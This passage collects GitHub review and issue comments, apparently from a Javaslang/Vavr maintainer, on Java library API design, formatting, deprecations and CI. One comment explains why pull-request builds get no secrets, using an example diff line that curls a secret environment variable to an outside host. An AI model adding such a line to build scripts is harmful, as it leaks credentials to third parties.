not return the previous instance when updating the Collection (because of the existing collection API). Cool!~~\n@paplorinc Update: I talk bullshit - need sleep :) Of course we do not because we do not wrap the delegate in a new view instance. gdn8!. @paplorinc you may also remove all the single-line comments from my code that state that an exception may be thrown. Anyway, in an ideal world these corner cases are covered by unit tests!\nCould you please check if List(1, 2, 3).asJava().removeAll(Arrays.asList(1, \"a\")); does throw? Accordingly to the j.u.List spec it should!. > It doesn't throw, it removes 1 internally.\nthx, that's what I suspected (because of type erasure the cast is ok as, long as no elements are casted). @paplorinc please hold your horses removing the mutable implementations. It is still not decided.... @seanf Hi Sean,\nthank you for your great review! Yes, reviewable seems to work well, I will check it out for this PR because you are used to it.\nAlso you are right that it is sometimes easier to create a commit for suggesting changes. I did the same. This change isn't small and it will heave a great impact because it is the interface between Java and Javaslang. Looking forward to see it in action :). @paplorinc I'm already on it. @seanf pushes me in the right direction. We will create a great solution.. Hi Lorinc, I hope you had a great time!\nYes, I think this PR can be closed now. The ofAll() methods need to be modified in the new PR but that should be all...\nThx!. Looks good!. We will not fuse the Pattern concept with the Value concept. This is obsolete.. Just one note: Style, especially formatting, is one of the most controversial topics discussed by developers. I've played around hours with different code-formats. My goals were:\n\nnot to diverge too much from our current code format\nincrease code readability\nnot add too much whitespace (especially when aligning code to the right)\n\nAs a result I switched only a few settings to 'Align when multiline':\n\nTernary operation (especially needed when having multiple branches: cond1 ? expr1 : cond2 ? expr2 : alt)\ntry-with-resources\nfor-statement\n\nOther categories could be aligned by inserting an additional line-break:\n```java\n// array initializer\nString[] arr = new String[] {\n        \"a\",\n        \"b\",\n        \"c\"\n};\n// chained method calls\nT result = object\n        .map()\n        .filter()\n        .reduce();\n```\n. did also some house-keeping:\n\nadded final keyword where applicable\nadded suppress-warnings to omit warnings\n...\n. I created this issue based on one of your recent statements that an operation takes linear time for small n. I wrote this ticket in a hurry from the top of my head. The description seems to be wrong but the problem seems to exist. However, until I find more detailed information I will close this ticket...\n\nSorry for confusing you. /cc @paplorinc . Well done, this looks great!. This seems to only affect Traversable.zipWithIndex().\n(Especially the other Traversable.zipWithIndex(BiFunction) is new in 2.1.0). vavr-0.9.0 (aka javaslang-2.1.0) will not be backward compatible.. @seanf @paplorinc I'm thankful for all your effort but this is too much for me :-) We now have two PRs open for the same issue and they diverge somehow.\nThe naming changed here, I created code that was not parameterized with an interface and so on. It is too much effort for me to review on that detail level on two diverging PRs.\nBeside that I've created already an own implementation in order to be able to give review code examples. This is a third impl for that issue now.\nLong story short: I want to finish my impl with your suggestions and close the existing two PRs in order to reduce the review noise and time effort.\nThat's the first time I do that and I hope not to piss off anyone...\n\nSide-note: For now we focus on using plain Github for reviews.. Added this to 2.1.0 again. We are half the way there. It is an important interoperability feature that has to be shipped.. Yes, implementing it seems to be overkill. Will merge it - thank you!\nI think we still have an open issue triggering the GWT build. I will take a look today!. Duplicate to #2234 . Hi Lukasz,\nthank you, this is a helpful addition!\nWe need a 'slight' modification. A recoverWith method that returns a Try instead of an Option fits better because the API is 'symmetric' to the existing one.\nHere are the existing methods (normal) and the new methods (bold):\nrecover():\n\nTry<T> recover(Function<Throwable, T> f)\nTry<T> recover(Class<X> exception, T value)\nTry<T> recover(Class<X> exception, Function<X, T> f)\n\nrecoverWith():\n\nTry<T> recoverWith(Function<Throwable, Try<T>> f)\nTry<T> recoverWith(Class<X> exception, Try<T> recovered)\nTry<T> recoverWith(Class<X> exception, Function<X, Try<T>> f)\n\nwhere X extends Throwable (above the generic bounds are left away for better readability).\nThe implementation would look like this:\n```java\n    @GwtIncompatible\n    default  Try recoverWith(Class exception, Try recovered) {\n        Objects.requireNonNull(exception, \"exception is null\");\n        Objects.requireNonNull(recovered, \"recovered is null\");\n        return (isFailure() && exception.isAssignableFrom(getCause().getClass()))\n               ? recovered\n               : this;\n    }\n@GwtIncompatible\n@SuppressWarnings(\"unchecked\")\ndefault <X extends Throwable> Try<T> recoverWith(Class<X> exception, Function<? super X, ? extends Try<? extends T>> f) {\n    Objects.requireNonNull(exception, \"exception is null\");\n    Objects.requireNonNull(f, \"f is null\");\n    if (isFailure()) {\n        final Throwable cause = getCause();\n        if (exception.isAssignableFrom(cause.getClass())) {\n            try {\n                return (Try<T>) f.apply((X) cause);\n            } catch (Throwable t) {\n                return new Failure<>(t);\n            }\n        }\n    }\n    return this;\n}\n\n```\nCould you add the above please?\n\nNote: Your use-case (the 403 error) can be recovered the same way. Just use Try.success() and Try.failure() instead of Option.some() and Option.none(). Or Try.of() instead of Option.of().\nIf you require an Option for some reason then you can simple call\njava\nTry.of(...).recoverWith(x, f).toOption();. Hi \u0141ukasz,\nawesome - it is great to have a more complete Try now!. @ruslansennov I plan to do many changes in the upcoming release vavr-0.9.0 that affect backward compatibility.\nThe upcoming release is no drop-in replacement anymore because of the new package names.\nIf someone wants to migrate his/her code to the new version, he/she needs control over the code. The breaking changes can be easily fixed if he/she has control over the code (presupposed a migration path exists).\nIn fact I see the name change as a lucky coincidence. Finally we are able to fix many issues. The backward compatibility slowed us down immensely.. @ruslansennov\n\nDaniel, I'm ready to begin\n\nGo ahead!. Fixed with #1954 . Fixes javaslang/javaslang-gwt#1. Many thanks, this looks great!. My current 'feeling' is, that Java is not the right language for this kind of feature. However, we can still examine what is possible.... For now, out of scope.. Note: Currently it is not clear if it is a bug in Javaslang or JDK9. But it seems to work correct with JDK8. However, Javaslang 2.1.0 needs to work correct with a future version of the JDK. So we need to solve this for the upcoming 2.1.0 release.. @paplorinc Thank you, that link is interesting!. @paplorinc Did your PR #1837 made memoization Java 9 compatible? Internally we do not use recursive memoization any more, right?. @paplorinc ping... (see https://github.com/javaslang/javaslang/issues/1762#issuecomment-278286892). @paplorinc Many thanks! \ud83d\ude0a The Scala code generator issue isn't critical for now because we build with Java 8 and will not move Javaslang to the Java 9 code level. Java 10 will be a very interesting release for us!. Hi James,\nI understand your desire, years ago I was also fascinated by the idea of extending existing final types in order to add functionality. The Java compatible language Xtend helps here by offering extension methods, which allow to seamlessly add new functionality to final types. With Scala's implicits we can do similar things.\nHowever, adding functionality using inheritance introduces several problems. The ones that come to my mind are:\n\nInheritance breaks the symmetry property of equals. See this explanation on Stackoverflow.\nThe second point is an implication of the first I think: We might get problems with pattern matching, which internally also relies on object identity (read: equals). For example Scala does also not allow to extend case classes, which are the basis for pattern matching in Scala. And I bet the upcoming value types (Project Valhalla/Brian Goetz) will also have to be final for similar reasons.\nEspecially extending the implementations of sum-types does not seem to make sense (example: Option = None or Some). Java does not have higher-kinder types (aka type constructors). We are not able to overwrite methods like flatMap() in an appropriate way. I don't know if this is really an issue but we might break the monad laws.\nSeveral Javaslang classes adjust return types throughout the type hierarchy. E.g. in Traversable we have Iterator<? extends Traversable<T>> sliding(int size);. CharSeq has Iterator<CharSeq> sliding(int size) which cannot be overwritten with a more special return type anymore. (We would need to declare Iterator<? extends CharSeq>. I don't know if this is desirable from the API perspective. I decided not to do it for final types.\n\nThere may be more points. But I think the equals() argument is a show-stopper.\n\nPersonally I create static helper methods if I need additional functionality, like this:\n```java\npublic final class StringExtensions {\n    private StringExtensions() {}\npublic static String firstUpper(String s) {\n    return s.isEmpty() ? s : s.substring(0, 1).toUpperCase() + s.substring(1);\n}\n\n}\n```\nOther languages have syntactic sugar, we have to call the helper method directly:\n```java\n// Scala and Xtend (maybe also Kotlin, C# and others)\n\"hello\".firstUpper\n// Java (using static import)\nfirstUpper(\"hello\")\n```\nBut I also understand that you want to add state-information to types, e.g.\njava\nclass UnicodeCharSeq extends CharSeq implements HasUnicodeCharacters {\n    ...\n}\nMaybe you will find a workaround using simulated union types!?\nLet's close this issue. I don't think it is a good idea to extend algebraic data types and value types in general.\n- Daniel. Hi Alpar, thank you - the PR looks great!\n/cc Lorinc, thanks for the review!. (I have this feeling that I must watch Game of Thrones...). Thank you!!. Yes, I also think the creational API of Multimap still can get hardened. I will take your suggestions into account when re-visiting the Multimap API before the 2.1.0-beta release.. @asarkar I think @ruslansennov added all missing methods. Please give us a sign if still s.th. is missing.. Note: I marked it as backward-compatible-relevant because the behaviour of Tree.toString changed.. Hi @Opalo,\nthank you for your contribution! I've checked your addition. It is well done but it does not fit into our overall design.\nLast month I received a similar PR: #1682 that targeted to add Option.fold(). There I linked an article\n\nBut then I read the following article and I agree: Option.fold() considered unreadable\n\nwhich cites Martin Odersky:\n\n\"I personally find methods (...) that take two closures as arguments are often overdoing it.\"\n\nI think this is also the case here. Beside that, a special method for Option does not scale very well. We could place it in a super type, say Value, but the API would overlap with Try.onSuccess(), Try.onFailure() etc.\nA mid-term goal is to reduce the Javaslang API. Version 3.0.0 will be a first step to simplify the API. With Project Valhalla we will have primitive generics + void, i.e. Function<void, void> will be the new Runnable and Function<T, void> the new Consumer. Given that we can express side-effects easily with the existing API, e.g. option.map(consumer).getOrElse(runnable).\n\nGenerally using Values for the control flow of side-effecting programs is discouraged. The only thing I can suggest here is using if-branches:\njava\nif (option.isDefined()) {\n    option.forEach(t -> {\n        // performSideEffects\n    });\n} else {\n   // perform side-effects\n}\n... or of course write your own helper.\nHope you understand that I will close the PR.\n- Daniel. Hi @Opalo, I understand the need for handling 'emptiness' in a concise way. \nI've thought about adding Value.onEmpty() as counterpart to Value.forEach(). But it complicates things:\n\nother types like Try (and Future) already have special handlers like onSuccess(), onFailure()\nScala 2.12 reduces these redundancies by falling back to forEach() again (see Futures in Scala 2.12).\n\nFor Either, Future and Try it is already implemented:\n\nfuture.failed().forEach()\ntry_.failed().forEach()\neither.left().forEach(), either.right.forEach()\n\nIt seems that Validation needs a similar way to handle invalid results.\nOption is different than the above because None does not contain any value that could be consumed. So the dual forEach() approach does not work here. Therefore I suggest to add a method onEmpty() in favour of a forEach() with two arguments:\njava\ninterface Option<T> {\n    default Option<T> onEmpty(Runnable action) {\n        if (isEmpty()) {\n            action.run();\n        }\n        return this;\n    }\n}\nExample:\njava\noption\n    .onEmpty(() -> {\n        /* perform side-effect */\n    })\n    .forEach(t -> ...);\nWhat do you think?. @Opalo that would be awesome! Looking forward to your PR. ~~I will re-open this issue and adjust the name...~~\nOhh - just realised that this is a PR, not an issue. Closed it again :) /cc @Opalo . Hi Dan,\nthank you for your contribution, it looks great! There are some minor issues: we make local variables final where possible and the formatting looks different to our project formatter (see .ide/) - but I will pull it in as-is because it is test code. From time to time we apply our formatter to the whole code-base.\nThx!\n. @xenoterracide thank you for your question.\nj.u.s.Stream is a completely different concept to existing collection libraries like those of Scala, Clojure ... and Javaslang. Java's Stream is just an Iterator. Given that you can't access specific elements or reuse it (e.g. by one or more threads). \nMy point is that Java 8 introduces lambdas but does not offer a new collection API (from the user perspective). It adds the new Stream API whose main purpose is to make it easier to perform parallel computations using the fork-join framework introduced in Java 7.\nWhen it comes to sequential computations, javaslang.collection.Iterator is better alternative to j.u.s.Stream which much more mature API and the same(!) performance characteristics (modulo primitive types - but this will be solved with Project Valhalla/primitive generics).\nIn Section 6 of Oracle's Secure Coding Guidelines for Java SE it is highly recommended to pass around immutable data objects. More specifically you will neither pass around j.u.s.Stream, nor you will pass around a mutable Java Collection - for a good reason.\nSo, from the user perspective we need to stream/process/collect data. That is cumbersome. Other languages/libraries show, how to do it better.\n\nAs I saw the new Java 8 API I thought \"No, not really!?!?\" Why we should complicate things by another layer of indirection - and type more code...\nStandard Java\n```\nCOMPUTATIONAL LAYER\n     x-----------x\n _ ^ _  _  | _  _ _\n     |           v\n\n----x           x----->\nDATA LAYER\n```\n\n... instead of doing it the direct way???\nJavaslang\n```\n\n----x-----------x----->\nDATA LAYER + COMPUTATION\n```\n. I think the documentation is correctly pointing to the nature of Java's Stream being an Iterator:\n\njava\n// i + 1\ni.prepareForAddition()\n .add(1)\n .mapBackToInteger(Mappers.toInteger())\nIn this context the documentation also mentions the BDSBTB 2015 keynote of Martin Odersky. He was the first who declares Java's Stream as \"fancy form of an Iterator\".\nI think there is nothing wrong with the documentation. Otherwise please suggest how to improve it.. Hi @eremeev,\nmany thanks for reporting the bug and providing us with such detailed information. This is really an interesting one!\nYou're right, the EMPTY instance should 1) not be public and 2) be moved to some other place.\nWe will deprecate it.\nHowever, in the past I was not 100% satisfied with making AbstractIterator public available. Maybe we should use it only internally.\n. @eremeev on my local machine all tests pass when we move Iterator.EMPTY to ItertatorModule (also located in Iterator.java):\n```java\ninterface Iterator ... {\n    ...\n}\ninterface IteratorModule {\n/**\n * The empty Iterator.\n */\nIterator<Object> EMPTY = new AbstractIterator<Object>() {\n\n    @Override\n    public boolean hasNext() {\n        return false;\n    }\n\n    @Override\n    public Object getNext() {\n        return null;\n    }\n};\n\n...\n\n}\n```\nDo you see any drawbacks regarding that solution? (Of course Iterator.EMPTY should be implemented as you suggested and be deprecated). @jest yes, this is a valid question.\nTL;DR:\nLet's consider the return type Iterator:\njava\nIterator<? extends Traversable<T>> slideBy(Function<? super T,? extends C> classifier);\nIf possible, we should implement the Iterator directly (like Iterator.sliding(int, int)) (instead of adding Collections.slideBy()) but not performing an internal conversion to Stream.\nOther collection.slideBy() implementations can than simply call\njava\niterator().slideBy(classifier).map(CollectionType::ofAll);\n\nI'm an observer, I looked at Scala's API and asked myself that question several times before.\nGenerally it is a good idea to consume time/mem when there is a demand for a computation. As we see, most javaslang.collection.Iterator methods can be implemented in a lazy way. So the question is why the (non-reducing) operations do return a new collection instead of an Iterator? And, on the other hand, why there exist operations (like grouped and sliding) that return an Iterator?\nWe do not need the Iterator type to reflect laziness. All collections could be implemented in a lazy way (under the hood).\nI think there are two main points returning a collection type (like filter and map do):\n\nThe type reflects specific characteristics/constraints that hold. E.g. when we filter the elements of a Set, the resulting subset is still a Set (= distinct, finite and not sequential).\nA collection can be traversed again (starting with 3.0.0 Iterator will not implement Traversable any more).\n\nOn the other hand these are the reasons to return an Iterator:\n\nIterative results may save intermediate object creation, they may save time and mem.\nA result of type Iterator may be preferred over Seq if the only characteristics of the result is sequential and most probably no random access is needed.\n\nHowever, if we decide to return Iterator, we can be still obtain another collection instance in O(n) by calling one of our conversion methods. Given that the time complexity would be equal to the case of returning a Seq instead of an Iterator.\nIn the case of slideBy() I see no difference to sliding(), they have the same purpose. So we should return an Iterator.. @jest alright!\n\nalthough I don't understand what you mean by \"but not performing an internal conversion to Stream\" in your comment.\n\nI looked at the implementation of Iterator.sliding() and recognised that we use split() and drop(), which need to traverse the source twice. Therefore the source Iterator is converted to a Stream, which can be traversed more than once. I think a different implementation is possible (using some state variables) without conversion to a Stream.\n\nAs for the method signature, is C type variable necessary?\n\nYou are right, the signature you suggested should perfectly do the job. I think ? is sufficient (compared to an alternative like ? extends Object).\nThank you!. Thank you, looks great!\n\nMan, that is a whole lot of file editing for such a small feature. :-)\n\nOhhh yeah, that's true. That's why I want to generate all this redundant boilerplate automatically. See #1716 \n. Thank you!. Yes. Interesting that we seem to rely on the order of sliding() in HashSetTest. Anyway - we should override the non-functional tests in HashSetTest (with an empty implementation). Maybe you could add a of(1, 2, 3).slideBy(Function.identity())-test (in AbstractTraversableTest) that asserts that the result equals Vector(of(1), of(2), of(3)) without taking the order into account (should be already the case because we override assertThat(Iterable<T> actual), see HashSetTest).. Great!\n\nIs it (generally) really necessary to convert test-results to Vector (using map(Vector::ofAll))? The tests could look like this:\njava\n@Test\npublic void shouldSlideNotNilByIdentityClassifier() {\n    final List<Traversable<Integer>> actual = of(1, 2, 3).slideBy(Function.identity()).toList();\n    final List<Traversable<Integer>> expected = List.of(of(1), of(2), of(3));\n    assertThat(actual).isEqualTo(expected);\n}\n. Ok, it might make sense for Iterator.slideBy() / sliding(). This will change with 3.0.0. For now it is ok then!. @gtrefs this can be closed, right?. > I had some craft beers \ud83d\ude04\nbeer only is ok, and always remember: wine after beer is fine ;-p\nLooks great to me! Waiting now for the CI server, then will pull it in.. Ok, will wait!. Looks awesome, thank you!. The PR #1779 did not deprecate the field, which is ok. I.e. this change is intentionally not backward compatible. We published the field by accident. It wasn't documented and I'm 99,9999999999...% sure no-one did use it. Especially Gen is not Serializable.... Looks great, thx!. Please give an example, how your example could be simplified. What is FunctionThrower? Please show that interface.\nNote: The example above is not correct. The final get() call may throw at runtime if the result of the Try.of() call is a Failure. What is strategies? A Traversable?\nPlease provide me with the missing details, e.g. make types explicit by adding variables.. Ok, that's something I can work with :-) Now we have the Stream.map() API:\njava\njava.utill.Stream.map(Function<? super T,? extends R> mapper)\nYou write:\njava\nStream.of(...).map(Try.of( ... ).onFailure( ... ) ). ... \nGiven that map() takes a Function I interpret this in the way that you want Try to extends Function. But I think what you really want is this:\njava\njava.util.stream.Stream.of(...).map(Try.asFunction(t -> trySomething(t)))...\nwith\njava\ninterface Try<T> {\n    static <T, R> Function<T, R> asFunction(Function<? super T, ? extends R> f) {\n        return t -> Try.of(() -> f(t)).getOrElse(???); // <-- not clear what to return in the case of a Failure\n    }\n}\nAs you see, there is still something missing:\n\nWhat to do in the Failure case?\nThere is no way to add an onFailure() handler in my example above\n\n\nI think what you really want is flatMap(), e.g.\njava\njava.util.stream.Stream\n    .of(...)\n    .flatMap(t -> Try.of(() -> trySomething(t)).onFailure(...).toJavaStream())\n    ...\nYou need to convert the Try to a Java Stream to be conform with Stream's flatMap() signature:\njava\njava.util.stream.Stream.flatMap(Function<? super T,? extends Stream<? extends R>> mapper)\n\nPlease give me more specific information what to do. E.g. sketch an implementation of the new functionality here. Especially provide an example of a specific input and the specific output for that case.\n. @xenoterracide as I already said, your code is broken because of Try...get() in the case of a Failure. Your test the 'happy path' - let it crash!\nRun this and you will see what I mean:\njava\nOptional<FileCreator> fileCreator = strategies.map(\n                s -> Try.of( () -> { throw new Error(\"test\") } ).onFailure( log()::error ).get() )\n                .filter( Optional::isPresent )\n                .map( Optional::get )\n                .findFirst()\n                .map( fc -> Try.of( fc::createFile ).onFailure( log()::error ).get() )\n                .filter( FileCreator::filter );\nYou can replace the get() with a getOrElse(Optional.empty()).\n\nBut I suggest to simplify your code by using Javaslang instead of Java ;)\n1) This seems to be your code (I reconstructed the interfaces):\n```java\npublic class BetterJava {\nvoid test(java.util.stream.Stream<Strategy> strategies, File file) {\n    Optional<FileCreator> fileCreator = strategies.map(\n            s -> Try.of(() -> s.fileCreatorFor(file)).onFailure(log()::error).get())\n            .filter(Optional::isPresent)\n            .map(Optional::get)\n            .findFirst()\n            .map(fc -> Try.of(fc::createFile).onFailure(log()::error).get())\n            .filter( FileCreator::filter );\n}\n\nLog log() {\n    return null;\n}\n\n}\ninterface Strategy {\n    Optional fileCreatorFor(File file);\n}\ninterface FileCreator {\n    FileCreator createFile();\n    static boolean filter(FileCreator fc) { return false; }\n}\ninterface Log {\n    void error(Throwable t);\n}\n```\n2) This is how I would do it\n```java\npublic class BetterJava {\nvoid test(javaslang.collection.Stream<Strategy> strategies, File file) {\n    Try<FileCreator> fcs = strategies\n            .flatMap(s -> s.fileCreatorFor(file).onFailure(log()::error)) // = Seq<FileCreator>\n            .headOption().toTry()                                         // = Try<FileCreator>\n            .flatMap(fc -> fc.createFile().onFailure(log()::error))       // = Try<FileCreator>\n            .filter(FileCreator::filter);\n}\n\nLog log() {\n    return null;\n}\n\n}\ninterface Strategy {\n    Try fileCreatorFor(File file);\n}\ninterface FileCreator {\n    Try createFile();\n    static boolean filter(FileCreator fc) { return false; }\n}\ninterface Log {\n    void error(Throwable t);\n}\n```\nInstead of javaslang.collection.Stream<Strategy> you might also use javaslang.collection.Iterator<Strategy> (if traversed only once).\n. I hope you don't mind if I close this issue. There are a couple of ways to achieve your goal. We can't invent something new here, especially not Try.function() because we would loose the error.. The one benefit I see is that all Javaslang types are Iterable. This makes flattening easier. In Java you need to map(), then filter(Optional::isPresent) and map(Optional::get), this can be done in one flatMap() step using Javaslang.\nMaybe Optional can be stream()-ed in JDK 9, I don't know. Then flatMap() will be easier using a Java Stream.. Thanks for the fix :). Thank you!. Thank you!. Great, thank you!. @chagmed Thank you for the PRs! They are very fine-grained. I think for future Mrs it is better to accumulate javadoc fixes in one PR.. Thank you!. Thank you!. Thank you!. Great, many thanks! One step further towards 2.1.0 :). Lovely feature, thank you for your patience \ud83d\ude4f . I will ship 2.1.0-beta as soon as possible. However, it will still take some time.... Hi @eremeev, @igoonich, a final review is greatly appreciated :)\nI introduced a new final class EmptyIterator, like you suggested. Also it is derived from Iterator instead of AbstractIterator. I took a look at java.util.Collections.EmptyIterator.\nI think the unit test will never fail because we cannot enforce to run the test before the Iterator class was initialized. When running this test in a big test suite (currently > 10000 unit tests) we may need a custom ClassLoader implementation for our test. But I think this is a bit too much and also a bit error prone because we introduce too much additional code for a unit test. In a perfect world a unit test introduces no additional code at all (only calls and assertions).\nThanks in advance,\n- Daniel. @eremeev thanks for the review. @hepin1989 thx, @eremeev and @igoonich did the real work!. Thank you @thekaratekid05! I can confirm your observation on the current master branch. The List.Cons.hashCode() implementation is based on a recursion of (head, tail).. Great, thank you! \ud83d\ude0a. Note: Some files changed because the year-update script might also change file endings. Just saying.. Current status:\n\n. @ruslansennov hah, no merge conflicts :). Hi @AlparSzabados,\nyour implementation is different than the description of the original issue #1659 in one important point: transpose() needs to be static.\nThe main reason is that Java is missing higher-kinder types / type constructors. transpose() is very much like flatten(), it is defined on nested structures only.\nYou try to 'heal' that issue by implementing some hidden 'magic', more specifically, the elements are wrapped in an Iterable if they are not of type Seq. This is not a good idea because it is not type-safe.\nExample:\nYou defined\njava\ninterface List<T> {\n    default <U> List<List<U>> transpose()\n}\nGiven that the following will compile:\njava\nList<Integer> list = ...;\nList<List<String>> transposed = list.transpose();\n\nI suggest to create static methods as requested in the issue. I think we should discuss the parameter types and return types:\n```java\ninterface List {\n// return type?\nstatic <T> List<List<T>> transpose(Iterable<? extends Iterable<? extends T>> rows);\nstatic <T> List<Seq<T>> transpose(Iterable<? extends Iterable<? extends T>> rows);\n\n// parameter types?\nstatic <T> List<List<T>> transpose(Iterable<? extends Iterable<? extends T>> rows);\nstatic <T> List<List<T>> transpose(Iterable<? extends Iterable<T>> rows);\nstatic <T> List<List<T>> transpose(Iterable<List<? extends T>> rows);\nstatic <T> List<List<T>> transpose(Iterable<List<T>> rows);\n\n}\n```\n. Btw - many thanks for your PR ;-). @AlparSzabados great to hear. I updated the issue: https://github.com/javaslang/javaslang/issues/1659#issuecomment-270940446. @AlparSzabados Many thanks, well done & awesome tests!. Will take a look today. @ruslansennov It works fine, I think is not an issue. But another issue raised: we need to trigger builds after we deployed a new snapshot. I will rename the issue and fix it.\nThere are two aspects that might be a little bit confusing:\n1) PR builds do not (and must not!) trigger other projects\nEveryone can submit a PR. Especially it would be a security risk, if external commiters would have read access to our credentials. I.e. the credentials could be sent clear-text to a third party server by adding a simple curl line to our travis-ci script before any code review takes place. Example:\ndiff\n// build script of Tonald Drump's 'elect-o-matic' open source project\n...\n+ curl http://hck.rs?lol=${ENV.SECURE}\n...\nFor this reason the travis-ci build environment does not load environment variables for a PR build.\n2) The javaslang-gwt project references maven artifacts\nCurrently we first trigger the javaslang-gwt build and then deploy the new snapshot (my fault). Of course we need to it in reverse order. I will commit a change.\nExample: PR 2016 -> 2017\nThe travis-ci configuration for the PR:\n\nThe travis-ci configuration for the merged PR:\n\n. If there is a tree, there is a traverse. We will see.... PriorityQueue will probably not part of Vavr 1. We want to focus on the most frequently used collections. Maybe we will release some kind of add-on collections package later.. PriorityQueue and Tree will probably not part of Vavr 1. We want to focus on the most frequently used collections. Maybe we will release some kind of add-on collections package later.. @ruslansennov I will start to implement this. It might have an impact to our current javaslang-jackson version - we will see.... @ruslansennov it should have no impact on current javaslang-jackson impl - we added the Serializable tagging interface to some interfaces. But we did not remove or change something existing.. I'm afraid, this is not possible - at least when using the same method name of, because it will raise ambiguities.\nFrom the viewpoint of the compiler\n\na lambda () -> retVal matches both signatures Supplier, CheckedSupplier and Callable\na lambda () -> {} matches the signatures Runnable, CheckedRunnable\n\nSo only one is possible when having the same method name of.\nI think it is not worth to introduce additional API, e.g.\n\nTry.ofCallable(Callable)\nTry.ofSupplier(Supplier)\n...\n\nJust calling\n\nTry.of(supplier::get)\n\nshould be sufficient.\n\nIf you agree we should close the ticket.. I thought a moment about removing Try.CheckedSupplier (in 3.0.0) and using Callable instead. But a CheckedSupplier throws Throwable and Callable throws Exception. It does not completely fit our needs.\nWe use the static methods fromXxx() to convert a value from one to another. It is the dual operation to toXxx(). Example:\n\nValidation.fromEither()\nValidation.toEither()\n\nTo to disambiguate of(CheckedSupplier) and of(Callable), the right name would be Try.ofCallable(Callable) (fromCallable does not fit because no conversion takes place).\nTo to disambiguate of(CheckedRunnable) and run(Runnable), the right name would be Try.runRunnable(Runnable) (which looks a bit weird).\nTo be congruent with Future, we need there also Future.ofCallable(Callable), Future.ofCallable(ExecutorService, Callable), Future.runRunnable(Runnable), Future.runRunnable(ExecutorService, Runnable)\nIf it helps, I'm fine with adding these methods.. > (or use CheckedFunction0 instead?)\nThe Try.Checked functions are a workaround. With Project Valhalla (primitive generics) we will remove the Try.Checked methods and have\n\nCheckedFunction0<R> extends CheckedFunction1<void, R> (or maybe remove Function0 completely)\nCheckedFunction0<void> instead of Try.CheckedRunnable\nCheckedFunction0<R> instead of Try.CheckedSupplier<R>\nCheckedFunction1<T, boolean> instead of Try.CheckedPredicate<T>\n...\n\nFor now we leave it as is.\n\nWhat about?\n\nLooks good. Additionally we need the ExecutorService param for Future:\n```java\nTry.ofCallable(Callable callable)\nTry.ofSupplier(Supplier supplier)\nTry.runRunnable(Runnable runnable)\nFuture.ofCallable(Callable callable)\nFuture.ofSupplier(Supplier supplier)\nFuture.runRunnable(Runnable runnable)\nFuture.ofCallable(ExecutorService executorService, Callable callable)\nFuture.ofSupplier(ExecutorService executorService, Supplier supplier)\nFuture.runRunnable(ExecutorService executorService, Runnable runnable)\n```. Yes, would be cool!. @ruslansennov Yes, but we only moved them (and not removed them).\nTo remove them we need ~~primitive~~ enhanced generics, like\njava\nFunction<void, T>    == Supplier<T>\nFunction<void, void> == Runnable\n.... For now we are finished. The story goes on when Java gets primitive generics.. @AlparSzabados Thank you for the example. You are right, there is no difference.\nIn fact it does not scale well to introduce special default methods that take Tuples.\nFor example HashMap.flatMap takes a BiFunction. If it would take a Function2 we could benefit from a default method that takes a Tuple2 but we can't pass a BiFunction any more.\njava\n<K2,V2> HashMap<K2,V2> flatMap(BiFunction<? super K,? super V,? extends Iterable<Tuple2<K2,V2>>> mapper)\nI remember once there was a suggestion to add special Tuple support to Functions and I decided not to do it. So we should close this ticket.\nIt is great to have a discussion. Sometimes it occurs that I have an idea without having analyzed it in depth. I create an issue because I do not want to forget it. The collection API is complex. There were many design decisions in the past. However, the conditions may change after some months. So thinking again and again about the same topic makes sense :)\nThank you!. @RobWin forgot one thing: all methods need to null-check the argument:\njava\nObjects.requireNonNull(<param-name>, \"<param-name> is null\");\n. Go, go, go :-)). It is Ok! I've learned that the JIT compiler is blazing fast. These are the arguments:\n\nwe have developer-friendly exceptions\nrequireNonNull calls will be inlined by the JIT compiler => no method calls!\nno increased mem-tradeoff/GC pressure here. Looks great, thank you for the long breath :-). Towards #1811 (the Try part). Nice finding, thanks!!. @noorulhaq Thank you for your question.\n\nThe following is equivalent to your solution:\njava\nTry<Option<String>> str1 = Try.of(()-> Option.of(\"Noor1\"));\nTry<Option<String>> str2 = Try.of(()-> Option.of(\"Noor2\"));\nTry<Option<Tuple2<String, String>>> result = str1.flatMap(o1 -> str2.map(o2 -> o1.flatMap(s1 -> o2.map(s2 -> Tuple.of(s1, s2)))));\nIn most cases flatMap can be used to solve problems that involve combination of wrapped/monadic values.\nDoes this help?. @noorulhaq please don't blame youself - the solution wasn't obvious.. @noorulhaq that sounds great! please don't hesitate to contact me if you have any questions.. see also #1815 (and #1816). Nice.\nIt should be located in Seq to be conform to the location of update(int, T).\nReason: Seq is indexed, regardless of performance characteristics.\nExample: If the user performs 1 million prepend operations and then one update(0, Character::toUpperCase), update will cost O(1). The user should decide which collections fits best. We should give the user all tools at hand to model his use-cases. Adding the new update() method only to IndexedSeq would include too many (false) assumptions.. I won't do that because it is 'too complicated' in the way that strings are no Collection and no Array but implicitly concidered to be like an Array. I like to keep the API dead-simple.\nUpdate: Also it will introduce ambiguities:\n// = Vector(hello) and Vector(h, e, l, l, o)\nVector(\"hello\");. I hope you don't mind if I close the ticket.. Great addition and well done! Thank you, L\u0151rinc.. Thanks!. Yes, that makes sense. We should in turn move part of the current README.md to the CONTRIBUTION.md.. I also think adding hashcodes is a viable solution. I created #1818 to ensure all Hash* impls work properly.\nThe StackOverflow problem is real (using Objects.hash(val) ... + tail.hashCode()). I fixed it recently for List.hashCode.... @ruslansennov Looks good to me! Please merge it if no one has any further objections :). Thank you for your question. I know, it is a little bit confusing. There are two rules regarding pattern matching:\n\nA whole dependency tree can be matched (as in your case)\nOnly the first layer will be decomposed due to limitations of Java\n\nYou ran into the 2. rule and expected that all $() occurrences will be extracted, regardless of the depth of occurrence within the object tree.\nIn fact it somehow worked in my first prototype of pattern matching. But all possible combinations of handlers / patterns had to be generated by the pattern compiler. The complexity exploded and often it exceeded the maximum size of bytecode of a class. Also the compiler seemed to need infinite time to compile these expressions or user-defined match cases. It wasn't practicable.\nIf there is a single value, the Case handles that value, like Case($(1), one -> ...).\nIf there is a composed value, the Case handles the first layer of the object tree:\njava\nCase(Some(List(None(), Some($()), Some(Tuple2(Left($())), ... )), list -> ...)\n\nI know that it would be better to have it like Scala but that was the best we could come up with regarding the limitations of Java's type system.\nHopefully this helps a bit.\n- Daniel. Thank you.. @Kreinoee You are right. To the time we initially designed the interfaces the future direction wasn't clear, e.g. adding mutable counterparts, parallel collection views, ...\nBut from the user-site viewpoint it makes absolutely sense to have abstract classes instead of interfaces. I will consider this change for the next major release 3.0.0.\nThank you!. > yeaaaah\nfinally... it took some years to align my synapses to that idea 